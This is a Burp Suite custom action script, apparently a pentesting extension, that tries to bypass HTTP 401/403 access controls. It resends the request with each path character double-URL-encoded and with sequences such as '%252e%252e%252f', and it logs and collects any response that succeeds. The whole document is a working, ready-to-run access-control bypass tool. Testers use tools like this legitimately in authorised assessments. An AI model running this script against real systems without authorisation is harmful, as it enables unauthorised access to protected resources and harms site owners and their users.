id: b089c2e1-45f8-4b7b-9c6d-bypass-encode-001
name: 403/401 Bypass - Double URL Encoding
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // 403/401 Bypass - Double URL Encoding
  // Tests bypass by double-encoding characters in the path
  
  int DELAY_MS = 50;
  boolean VERBOSE = true;
  
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  var originalPath = originalRequest.path();
  int originalStatus = requestResponse.response().statusCode();
  
  logging.logToOutput("=== 403/401 Bypass - Double URL Encoding ===");
  logging.logToOutput("Target: " + httpService.host() + originalPath);
  logging.logToOutput("Original Status: " + originalStatus);
  logging.logToOutput("");
  
  int total = 0, success = 0;
  
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
  
  String pathWithoutQuery = originalPath.contains("?") ? 
      originalPath.substring(0, originalPath.indexOf("?")) : originalPath;
  
  // Double encode each character position
  for (int i = 0; i < pathWithoutQuery.length() && i < 30; i++) {
      char c = pathWithoutQuery.charAt(i);
      if (c != '/') {
          try {
              // Double encode: char -> %XX -> %25XX
              String singleEncoded = String.format("%%%02X", (int) c);
              String doubleEncoded = singleEncoded.replace("%", "%25");
              String newPath = pathWithoutQuery.substring(0, i) + doubleEncoded + 
                  pathWithoutQuery.substring(i + 1);
              
              var req = originalRequest.withPath(newPath);
              var resp = api.http().sendRequest(req);
              Thread.sleep(DELAY_MS);
              
              int status = resp.response().statusCode();
              String note = "pos[" + i + "] '" + c + "' -> " + doubleEncoded + " : " + status;
              
              if (isSuccess.test(originalStatus, status)) {
                  success++;
                  logging.logToOutput("[+] SUCCESS: " + note);
                  var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
                  rr.annotations().setNotes("Double Encode Bypass: " + newPath);
                  api.organizer().sendToOrganizer(rr);
              } else if (VERBOSE) {
                  logging.logToOutput("[-] " + note);
              }
              total++;
          } catch (Exception e) {
              logging.logToError("Error: " + e.getMessage());
          }
      }
  }
  
  // Also test common double-encoded sequences
  String[][] commonEncodings = {
      {"/", "%252f"}, {".", "%252e"}, {"..", "%252e%252e"},
      {"../", "%252e%252e%252f"}, {";", "%253b"}, {"?", "%253f"},
      {"#", "%2523"}, {" ", "%2520"}
  };
  
  for (String[] enc : commonEncodings) {
      if (pathWithoutQuery.contains(enc[0])) {
          try {
              String newPath = pathWithoutQuery.replace(enc[0], enc[1]);
              var req = originalRequest.withPath(newPath);
              var resp = api.http().sendRequest(req);
              Thread.sleep(DELAY_MS);
              
              int status = resp.response().statusCode();
              String note = "'" + enc[0] + "' -> '" + enc[1] + "' : " + status;
              
              if (isSuccess.test(originalStatus, status)) {
                  success++;
                  logging.logToOutput("[+] SUCCESS: " + note);
                  var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
                  rr.annotations().setNotes("Double Encode Bypass: " + newPath);
                  api.organizer().sendToOrganizer(rr);
              } else if (VERBOSE) {
                  logging.logToOutput("[-] " + note);
              }
              total++;
          } catch (Exception e) {
              logging.logToError("Error: " + e.getMessage());
          }
      }
  }
  
  logging.logToOutput("");
  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
